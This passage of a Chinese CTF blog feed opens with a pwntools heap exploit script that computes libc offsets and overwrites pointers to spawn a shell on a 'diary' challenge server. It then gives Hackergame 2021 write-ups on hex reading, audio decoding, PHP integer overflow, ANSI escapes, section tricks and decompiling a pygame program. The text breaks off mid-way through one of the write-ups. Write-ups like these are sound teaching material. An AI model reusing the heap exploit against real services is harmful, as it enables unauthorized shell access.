class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">p, n, echo=<span class="literal">True</span></span>):</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n):</span><br><span class="line">        b = p.recvline()</span><br><span class="line">        <span class="keyword">if</span> echo: <span class="built_in">print</span>(<span class="built_in">str</span>(b, encoding=<span class="string">&#x27;utf-8&#x27;</span>), end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p_puts = <span class="number">0x76210</span></span><br><span class="line">    o_system = <span class="number">0x49E10</span> - p_puts</span><br><span class="line">    o_cmd = <span class="number">0x18969B</span> - p_puts</span><br><span class="line">    p = process(<span class="string">&#x27;./diary&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p_puts = <span class="number">0x875A0</span></span><br><span class="line">    o_system = <span class="number">0x55410</span> - p_puts</span><br><span class="line">    o_cmd = <span class="number">0x1B75AA</span> - p_puts</span><br><span class="line">    p = remote(<span class="string">&#x27;sec.arttnba3.cn&#x27;</span>, <span class="number">10001</span>)</span><br><span class="line"></span><br><span class="line">get(p, <span class="number">27</span>, <span class="literal">False</span>)</span><br><span class="line">q = p.recvline()[<span class="number">50</span>:]</span><br><span class="line">q = <span class="built_in">int</span>(q[:q.find(<span class="string">b&#x27; &#x27;</span>)], <span class="number">16</span>)</span><br><span class="line">c, q = q + o_cmd, q + o_system</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;system at %016X, cmd at %016X&#x27;</span> % (q, c))</span><br><span class="line">get(p, <span class="number">2</span>, <span class="literal">False</span>)</span><br><span class="line"></span><br><span class="line">get(p, <span class="number">6</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">get(p, <span class="number">6</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;96&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line">p.sendline()</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">get(p, <span class="number">6</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get(p, <span class="number">6</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">get(p, <span class="number">6</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;16&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line">p.sendline(p64(c) + p64(q))</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">get(p, <span class="number">6</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">get(p, <span class="number">1</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{h3@p_1s_s0_s1mp13_7o_3xp10I7!}</p></blockquote><p>嗯, 就写到这, 吃饭去了<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/187/3376.png" alt="[干物妹！小埋_好累啊]"></img></p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> reverse </tag>
            
            <tag> ctf </tag>
            
            <tag> pwn </tag>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hackergame 2021</title>
      <link href="/2021/11/04/Hackergame2021/"/>
      <url>/2021/11/04/Hackergame2021/</url>
      
        <content type="html"><![CDATA[<h1 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h1><p>中科大的比赛, 个人感觉难度挺高, 甚至很多知识技能闻所未闻.<br><a href="https://hack.lug.ustc.edu.cn/">网站链接</a></p><h2 id="进制十六——参上"><a href="#进制十六——参上" class="headerlink" title="进制十六——参上"></a>进制十六——参上</h2><p>一个很典型的十六进制编辑器界面, 左边是十六进制, 右边是字符.</p><p><img src="/pictures/hackergame_2021_hex_1.jpg" alt="题图"></p><p>直接对着左边去推右边的flag即可.</p><p>淦! 当时对着图抄都能抄错, 而且还抄错好几次, 少一行或者缺个字母. 当时一直觉得flag很奇怪<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/1/509.png" alt="[笑哭]"></img>.</p><blockquote><p>在这里推荐一个十六进制编辑器: <a href="https://mh-nexus.de/en/hxd/">HxD Hex Editor</a><br>这个感觉用起来比较舒服, 可以看16进制表示的整数, 浮点数或者是指令. 可以打开超大文件的同时, 也可以打开磁盘或者<strong>某程序的内存空间</strong>!<br>感觉比WinHex好用, 最重要的是这个不用收费.</p></blockquote><h2 id="去吧！追寻自由的电波"><a href="#去吧！追寻自由的电波" class="headerlink" title="去吧！追寻自由的电波"></a>去吧！追寻自由的电波</h2><p>flag就在音频里, 但是音频被加速了, 完全听不出来.<br>用PotPlayer打开, 尝试减速, 结果… 声音频率没变, 还是听不出来.<br>那就用GoldWave看看吧, 当年剪一段音频的时候用的就是这个.</p><p><img src="/pictures/hackergame_2021_radio_1.jpg" alt="识别过程"></p><p>开0.5倍, 整个音频很清晰. 所有单词除了leftbracket和rightbracket代表左右花括号外, 其他的都是首字母代表译文的一个字母.</p><blockquote><p>听了一个学长的分享, 这个表达方式叫北约音标字母, <a href="https://baike.baidu.com/item/%E5%8C%97%E7%BA%A6%E9%9F%B3%E6%A0%87%E5%AD%97%E6%AF%8D/4157760">传送门</a></p></blockquote><h2 id="卖瓜"><a href="#卖瓜" class="headerlink" title="卖瓜"></a>卖瓜</h2><p>题目要求我们放x个6斤的瓜和y个9斤的瓜, 让称上的结果为20斤.<br>先尝试用小数, 发现小数部分会被截断. 负数也被提示无效输入, What’s up? 然后就把这题跳了.</p><p>几天后看这题通过人数, 发现还挺多的, 就再来试试.<br>输入1024819115206086201(因为它等于<code>ceil(LONG_MAX, 9)</code>)看看有什么情况, 发现结果溢出了变成了负数.<br>查找相关资料, php的整数在过大时会自动转换为浮点数, 但是浮点数表示较大整数是有误差的, 而且数越大误差越大.<br>照这个思路, 我们想办法得到一个有误差的大负数, 然后加上一个正数, 就可能让结果为20.<br>然后开始一个一个试, 从1024819115206086201开始的好几百个数, 结果都是-9223372036854775808. 但是这个数表示我们要的, 因为20减去它并不是3的倍数.<br>直到输入1024819115206086600, 结果变成了-9223372036854771712, 这个行了, 然后填入合适的6斤的瓜.<br>$ 20+9223372036854771712=1537228672809128622 \times 6 $.</p><p>值得注意的是, 这两个数不能同时填入. 得先填9斤的让结果溢出, 再填上6斤的把数加回来.</p><h2 id="透明的文件"><a href="#透明的文件" class="headerlink" title="透明的文件"></a>透明的文件</h2><p>打开文件发现是这么个格式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0;0H[20;58H[8;34H[13;27H[4;2H[38;2;1;204;177m [39m[14;10H[20;51H[23;4H[12;2H[38;2;2;207;173m </span><br></pre></td></tr></table></figure><p>DNA动了! 高三学C时在手机上写了几个控制台小游戏, 清楚地记得这种奇怪的格式.(<a href="https://www.cnblogs.com/demonxian3/p/8963807.html">传送门</a>)<br>意思就是说, \033(或者\x1e)+左方括号+一堆数字和分隔符+某个字母可以产生一些特别的效果.<br>比如清屏, 光标移动, 字符颜色什么的(甚至unistd.h里面一些宏都是拿printf这么干的).<br>观察一下这个文件, 发现每个左中括号前面的控制字符都不见了, 那就记事本打开把<code>[</code>全替换成<code>\033[</code>, 再把所有空格改成能看见的字符, 空格替换为<code>#</code>.<br>把这个丢到printf里作为格式串, 在linux或者android里面都可以跑出来, 在cmd里面是看不出结果的.</p><blockquote><p>但是, 在cmd中真的不能看到结果吗?</p></blockquote><p>在Windows中有一个API <code>SetConsoleMode</code>, 这个API可以设置控制台的某些属性, 我之前写过一个小工具让控制台能够接受鼠标的点击, 它的核心点也是这个.<br>下面是让cmd成功显示flag的代码:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> BOOL <span class="title">enableCtl</span><span class="params">()</span></span>&#123;</span><br><span class="line">    BOOL ret = FALSE;</span><br><span class="line">    HANDLE hStdOut = GetStdHandle(STD_OUTPUT_HANDLE);</span><br><span class="line">    <span class="keyword">if</span> (hStdOut != INVALID_HANDLE_VALUE)&#123;</span><br><span class="line">        DWORD mode;</span><br><span class="line">        <span class="keyword">if</span> (GetConsoleMode(hStdOut, &amp;mode))&#123;</span><br><span class="line">            mode |= ENABLE_LINE_INPUT | ENABLE_ECHO_INPUT;</span><br><span class="line">            ret = SetConsoleMode(hStdOut, mode);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    enableCtl();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;格式化好的字符串, 太长了不贴了, 源码在下面&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><a download href="/archives/hackergame_2021_flag.zip" style="display: block;"><span class="iconfont icon-archive-c"></span>源码</a><p>命令行: <code>gcc test.cpp -o test &amp; cls &amp; test &amp; pause &gt; nul</code></p><p>运行结果(我习惯白底的cmd, 然后就是这样):<br><img src="/pictures/hackergame_2021_ansi_1.jpg" alt="flag"></p><p>Windows yyds!!!</p><h2 id="中间省略一万字"><a href="#中间省略一万字" class="headerlink" title="中间省略一万字"></a>中间省略一万字</h2><p>别问, 问就是不想写<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/1/20.png" alt="[傲娇]"></img><br><del>其实是不会写</del></p><h2 id="Amnesia-1"><a href="#Amnesia-1" class="headerlink" title="Amnesia #1"></a>Amnesia #1</h2><p>写一个Hello world, 但会把你的.data段和.rodata段清除.</p><p>.data段存放程序数据, 一般是全局数组之类的; .rodata段存放只读的数据, 像字符串就在此处. 所以你的程序不能出现字符串, 除非换一个段, 比如下面的程序能跑:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((section(<span class="string">&quot;.fake&quot;</span>)))</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">char</span> msg[] = <span class="string">&quot;Hello, world!&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但这种方法是很不稳定的. 假如你使用的是<code>printf</code>, 编译器会把你带换行符的<code>msg</code>一并优化为<code>puts(msg2);</code>, 其中msg2是不带换行符的msg. 这样, .fake段就是msg, .rodata段就是msg2, 而优化后的程序使用的是msg2, 所以还是会被清掉.</p><p>不使用数据段的话可以这样:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> s[] = &#123;<span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>&#125;;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span> (s); i++) <span class="built_in">putchar</span>(s[i]);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Micro-World"><a href="#Micro-World" class="headerlink" title="Micro World"></a>Micro World</h2><p>用Spy++查看窗口类名, 是pygame, 确定这是python写的. 像这种比较大的程序一般都是脚本打包, 而不是C++写的(Qt什么的就另说).<br>pyinstxtractor解包并修复后, 得到pyc文件. 使用uncompyle6反编译, 成功输出py脚本.<br>然后运行发现是黑框框, 什么都没有???</p><p>然后就看源码吧, 把一些不合逻辑的代码改一改, 最后再把速度取反, 就能反向运行啦</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#game.pyw</span></span><br><span class="line"><span class="keyword">import</span> time, pygame, random, math</span><br><span class="line">WIDTH = <span class="number">800</span></span><br><span class="line">HEIGHT = <span class="number">480</span></span><br><span class="line">FPS = <span class="number">30</span></span><br><span class="line">RADIUS = <span class="number">6</span></span><br><span class="line">WHITE = (<span class="number">255</span>, <span class="number">255</span>, <span class="number">255</span>)</span><br><span class="line">BLACK = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">RED = (<span class="number">255</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">GREEN = (<span class="number">0</span>, <span class="number">255</span>, <span class="number">0</span>)</span><br><span class="line">BLUE = (<span class="number">0</span>, <span class="number">0</span>, <span class="number">255</span>)</span><br><span class="line">pygame.init()</span><br><span class="line">pygame.mixer.init()</span><br><span class="line">screen = pygame.display.set_mode((WIDTH, HEIGHT))</span><br><span class="line">pygame.display.set_caption(<span class="string">&#x27;Micro world&#x27;</span>)</span><br><span class="line">clock = pygame.time.Clock()</span><br><span class="line">running = <span class="literal">True</span></span><br><span class="line">count = <span class="number">0</span></span><br><span class="line">list_ = [数据太长不贴了, 源码在下面]</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Point</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, pos, vx, vy</span>):</span></span><br><span class="line">        self.x, self.y = pos</span><br><span class="line">        self.vx = vx</span><br><span class="line">        self.vy = vy</span><br><span class="line">        self.flag = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dotproduct</span>(<span class="params">v1, v2</span>):</span></span><br><span class="line">    <span class="keyword">return</span> v1[<span class="number">0</span>] * v2[<span class="number">0</span>] + v1[<span class="number">1</span>] * v2[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkcrush</span>(<span class="params">point1, point2</span>):</span></span><br><span class="line">    distance = math.sqrt((point1.x - point2.x) ** <span class="number">2</span> + (point1.y - point2.y) ** <span class="number">2</span>)</span><br><span class="line">    a = (point1.vx - point2.vx) ** <span class="number">2</span> + (point1.vy - point2.vy) ** <span class="number">2</span></span><br><span class="line">    b = <span class="number">2</span> * (point1.x - point2.x) * (point1.vx - point2.vx) + <span class="number">2</span> * (point1.y - point2.y) * (point1.vy - point2.vy)</span><br><span class="line">    c = distance ** <span class="number">2</span> - <span class="number">4</span> * RADIUS ** <span class="number">2</span></span><br><span class="line">    delta = b ** <span class="number">2</span> - <span class="number">4</span> * a * c</span><br><span class="line">    <span class="keyword">if</span> delta &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    time = (-b - math.sqrt(delta)) / (<span class="number">2</span> * a)</span><br><span class="line">    <span class="keyword">if</span> time &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> time &lt; <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">return</span> time</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_new_point</span>(<span class="params">time, point1, point2</span>):</span></span><br><span class="line">    distance = math.sqrt((point1.x - point2.x) ** <span class="number">2</span> + (point1.y - point2.y) ** <span class="number">2</span>)</span><br><span class="line">    standard_displacement = ((point2.x - point1.x) / distance, (point2.y - point1.y) / distance)</span><br><span class="line">    v_1 = (point1.vx, point1.vy)</span><br><span class="line">    v_2 = (point2.vx, point2.vy)</span><br><span class="line">    v_par_1 = dotproduct(standard_displacement, v_1)</span><br><span class="line">    v_par_2 = dotproduct(standard_displacement, v_2)</span><br><span class="line">    v_ver_1 = (point1.vx - v_par_1 * standard_displacement[<span class="number">0</span>], point1.vy - v_par_1 * standard_displacement[<span class="number">1</span>])</span><br><span class="line">    v_ver_2 = (point2.vx - v_par_2 * standard_displacement[<span class="number">0</span>], point2.vy - v_par_2 * standard_displacement[<span class="number">1</span>])</span><br><span class="line">    v_after_par_1 = v_par_2</span><br><span class="line">    v_after_par_2 = v_par_1</span><br><span class="line">    v_after_1 = (v_after_par_1 * standard_displacement[<span class="number">0</span>] + v_ver_1[<span class="number">0</span>], v_after_par_1 * standard_displacement[<span class="number">1</span>] + v_ver_1[<span class="number">1</span>])</span><br><span class="line">    v_after_2 = (v_after_par_2 * standard_displacement[<span class="number">0</span>] + v_ver_2[<span class="number">0</span>], v_after_par_2 * standard_displacement[<span class="number">1</span>] + v_ver_2[<span class="number">1</span>])</span><br><span class="line">    afterpos_1 = (point1.x + point1.vx * time + v_after_1[<span class="number">0</span>] * (<span class="number">1</span> - time), point1.y + point1.vy * time + v_after_1[<span class="number">1</span>] * (<span class="number">1</span> - time))</span><br><span class="line">    afterpos_2 = (point2.x + point2.vx * time + v_after_2[<span class="number">0</span>] * (<span class="number">1</span> - time), point2.y + point2.vy * time + v_after_2[<span class="number">1</span>] * (<span class="number">1</span> - time))</span><br><span class="line">    <span class="keyword">return</span> (Point(afterpos_1, v_after_1[<span class="number">0</span>], v_after_1[<span class="number">1</span>]), Point(afterpos_2, v_after_2[<span class="number">0</span>], v_after_2[<span class="number">1</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">drawpoint</span>(<span class="params">screen, list_</span>):</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> list_:</span><br><span class="line">        pygame.draw.circle(screen, BLUE, (<span class="built_in">round</span>(item.x), <span class="built_in">round</span>(item.y)), RADIUS, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">next_pos_list</span>(<span class="params">Pointlist</span>):</span></span><br><span class="line">    pointlist = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(Pointlist)):</span><br><span class="line">        <span class="keyword">for</span> point <span class="keyword">in</span> Pointlist[i + <span class="number">1</span>:]:</span><br><span class="line">            times = checkcrush(Pointlist[i], point)</span><br><span class="line">            <span class="keyword">if</span> times != <span class="literal">None</span>:</span><br><span class="line">                a, b = get_new_point(times, Pointlist[i], point)</span><br><span class="line">                pointlist.extend([a, b])</span><br><span class="line">                Pointlist[i].flag = <span class="number">0</span></span><br><span class="line">                point.flag = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> Pointlist:</span><br><span class="line">        <span class="keyword">if</span> item.flag != <span class="number">0</span>:</span><br><span class="line">            pointlist.append(Point((item.x + item.vx, item.y + item.vy), item.vx, item.vy))</span><br><span class="line">        <span class="keyword">for</span> poi <span class="keyword">in</span> pointlist:</span><br><span class="line">            poi.x = poi.x % WIDTH</span><br><span class="line">            poi.y = poi.y % HEIGHT</span><br><span class="line">    <span class="keyword">return</span> pointlist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Pointlist = []</span><br><span class="line"><span class="keyword">for</span> item <span class="keyword">in</span> list_.__reversed__():</span><br><span class="line">    Pointlist.append(Point((item[<span class="number">0</span>], item[<span class="number">1</span>]), -item[<span class="number">2</span>], -item[<span class="number">3</span>]))</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">value</span>(<span class="params">lis</span>):</span></span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> item <span class="keyword">in</span> lis:</span><br><span class="line">            count = count + (item.x - <span class="built_in">round</span>(item.x)) ** <span class="number">2</span> + (item.y - <span class="built_in">round</span>(item.y)) ** <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> count</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> running:</span><br><span class="line">        clock.tick(FPS)</span><br><span class="line">        <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="keyword">if</span> event.<span class="built_in">type</span> == pygame.QUIT:</span><br><span class="line">                running = <span class="literal">False</span></span><br><span class="line">            screen.fill(BLACK)</span><br><span class="line">            drawpoint(screen, Pointlist)</span><br><span class="line">            Pointlist = next_pos_list(Pointlist)</span><br><span class="line">            pygame.display.flip()</span><br><span class="line"></span><br><span class="line">    pygame.quit()</span><br><span class="line"></span><br></pre></td></tr></table></figure><a download href="/archives/hackergame_2021_microworld.zip" style="display: block;"><span class="iconfont icon-archive-c"></span>源码</a><p>程序运行的结果如下, 不知道为啥只有鼠标放在窗口上面才会运转, 不过这样更好, 容易看出 flag<br><img src="/pictures/hackergame_2021_microworld_1.jpg" alt="microworld"></p><p>uncompyle真jier坑<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/1/10.png" alt="[生气]"></img></p><h2 id="minecRaft"><a href="#minecRaft" class="headerlink" title="minecRaft"></a>minecRaft</h2><p>打开游戏, 没玩懂, 那就直接F12吧, 看到下面的:<br><img src="/pictures/hackergame_2021_minecraft_1.jpg" alt="资源"><br>保存一下js, 给它格式化:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span 